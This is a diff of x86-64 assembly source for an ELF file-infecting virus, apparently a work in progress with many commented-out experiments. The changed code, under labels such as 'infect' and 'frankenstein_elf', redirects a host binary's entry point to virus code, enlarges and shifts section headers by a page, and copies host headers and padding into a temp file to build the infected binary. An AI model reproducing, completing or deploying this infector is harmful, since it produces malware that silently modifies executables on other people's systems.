@@ -228,6 +228,7 @@ SYS_WRITE 		equ 0x1
 SYS_OPEN 		equ 0x2
 SYS_CLOSE 		equ 0x3
 SYS_FSTAT 		equ 0x5
+SYS_LSEEK 		equ 0x8
 SYS_MMAP 		equ 0x9
 SYS_MUNMAP		equ 0xB
 SYS_PREAD64 	equ 0x11
@@ -282,12 +283,18 @@ checkptloadpasslen equ $-checkptloadpass
 checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
 checkptloadfaillen equ $-checkptloadfail
 
+textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
+textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
+textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
+textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
 ;****************************************************************************************
 
 ;variables used for phdr and shdr manipulation routines
 
 evaddr: dq 0
 oshoff: dq 0
+
+hostentry_offset: dd 0
 vxhostentry: dq 0
 vxoffset: dq 0
 ventry equ $_start 
@@ -312,6 +319,8 @@ O_RDONLY		equ 0x0
 O_CREAT			equ 100o
 O_TRUNC			equ 1000o
 O_APPEND		equ 2000o
+
+SEEK_CUR 		equ 0x1
 
 S_IFREG    		dq 0x0100000   ;regular file
 S_IFMT 			dq 0x0170000
@@ -698,6 +707,8 @@ infect:
 	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
 	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
 	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
+	;mov qword [hostentry_offset], r13	;move r13 to saved var hostentry_offset, 
+									;to be used for calculating offsets w writes to temp file
 	mov rdx, checkphdrstartlen
 	lea rsi, checkphdrstart
 	mov rdi, STDOUT
@@ -738,9 +749,9 @@ infect:
 				syscall
 				mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 				add r10, [r13 + r12 + elf_phdr.p_filesz]
-				add qword r10, [ventry]				;new entry point = evaddr + ventry
-				mov qword [evaddr], r10
-				mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
+				mov qword [evaddr], r10				;save evaddr
+				add qword r10, [ventry]				;new entry point of infected file = evaddr + ventry
+				mov [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
 				mov r10, [r13 + r12 + elf_phdr.p_offset] 
 				add r10, [r13 + r12 + elf_phdr.p_filesz]				
 				mov qword [vxoffset], r10
@@ -757,9 +768,12 @@ infect:
 		.next_phdr:
 			dec cx 
 			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			;add [hostentry_offset], word [r13 + elf_hdr.phentsize]
 			cmp cx, 0
 			jg .phdr_loop
 			;jg check_shdrs
+	;add qword [hostentry_offset], r12
+	mov dword [hostentry_offset], r12d
 	jmp frankenstein_elf
 	;jg check_shdrs
 ;****************************************************************************************
@@ -779,19 +793,19 @@ infect:
 			add r11, [r13 + r15 + elf_shdr.sh_size]
 			cmp r10, r11
 			jne .mod_subsequent_shdr
-			add qword [r15 + elf_shdr.sh_size], vlen
+			add qword [r13 + r15 + elf_shdr.sh_size], vlen
 
 
 			.mod_subsequent_shdr:
-				add qword [r15 + elf_shdr.sh_offset], PAGESIZE
+				add qword [r13 + r15 + elf_shdr.sh_offset], PAGESIZE
 		;.next_shdr:
 		pop rcx
 		inc rcx 
 		add r15, rdx 
-		cmp rcx, [rax + elf_ehdr.e_shnum]
+		cmp rcx, [r13 + elf_ehdr.e_shnum]
 		jl .shdr_loop
 
-	mov r11, qword [rax + elf_ehdr.e_shoff]
+	mov r11, qword [r13 + elf_ehdr.e_shoff]
 	mov qword [oshoff], r11
 	cmp qword r11, [vxoffset]
 	;jg .patch_ehdr_shoff
@@ -857,25 +871,77 @@ frankenstein_elf:
 	;write ELF header to temp file
 	;actually just write the first 1024 bytes of target ELF to temp file
 
-	;mov rdx, 512
-	;mov rdx, 64
-	mov rdx, 1024
-	mov rsi, r13					;r13 contains pointer to mmap'd file
-	mov rax, SYS_WRITE
-	syscall
+	cmp dword [hostentry_offset], PAGESIZE
+	jl .adjust_offset_ehdr_phdr_copy
+	jmp .offset_ehdr_phdr_copy_pagesize
+	.adjust_offset_ehdr_phdr_copy:
+		;mov rdx, textsegmentoffset_pageno_len
+		;lea rsi, textsegmentoffset_pageno
+		;mov rdi, STDOUT
+		;mov rax, SYS_WRITE
+		;syscall
+
+		;xor rdx, rdx	
+		mov rdx, [hostentry_offset]
+		jmp .write_ehdr_phdrs
+	.offset_ehdr_phdr_copy_pagesize:
+		;mov rdx, textsegmentoffset_pageyes_len
+		;lea rsi, textsegmentoffset_pageyes
+		;mov rdi, STDOUT
+		;mov rax, SYS_WRITE
+		;syscall
+		
+		;xor rdx, rdx	
+		mov rdx, [PAGESIZE]
+	.write_ehdr_phdrs:	
+		;mov rdx, 512
+		;mov rdx, 64
+		;mov rdx, 1024
+		mov rsi, r13					;r13 contains pointer to mmap'd file
+		mov rax, SYS_WRITE
+		syscall
+
+	;.lseek_end_phdrs:
+		;mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+		;mov rsi, rdx					;(offset in rsi =hostentryoffset)
+		;mov rdx, SEEK_CUR				;fd set to current position + offset 
+		;mov rax, SYS_LSEEK
+		;syscall
+
+	.write_padding_until_textsegment:		
+		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+	;	mov rdx, PAGESIZE
+		;add rdx, [hostentry_offset]
+		mov rsi, r13
+		add rsi, [hostentry_offset]
+		;mov r10, [hostentry_offset]
+		mov r10, [hostentry_offset]
+		;lea rsi, [r13 + hostentry_offset]
+		mov rax, SYS_PWRITE64
+		syscall
+	;.lseek_textsegment:
 	
-	;munmap file from work area
-	;mov qword rsi, [elf_filesize]
-;	mov rdi, r13
-;	mov rsi, [r14 + filestat.st_size]
-;	mov rax, SYS_MUNMAP
-;	syscall
+
+	;.write_hosttextsegment:
+	;	mov rdx, [PAGESIZE]
+	;	mov rsi, [r13 + hostentry_offset]					;r13 contains pointer to mmap'd file
+	;	mov rsi, r13
+	;	add rsi, hostentry_offset
+	;	mov rax, SYS_WRITE
+	;	syscall
+		
+		;munmap file from work area
+		;mov qword rsi, [elf_filesize]
+	;	mov rdi, r13
+	;	mov rsi, [r14 + filestat.st_size]
+	;	mov rax, SYS_MUNMAP
+	;	syscall
 
 	;close temp file
-
-	mov rdi, r9
-	mov rax, SYS_CLOSE
-	syscall
+	.close_temp:
+		mov rdi, r9
+		mov rax, SYS_CLOSE
+		syscall
 
 
 fin_infect:
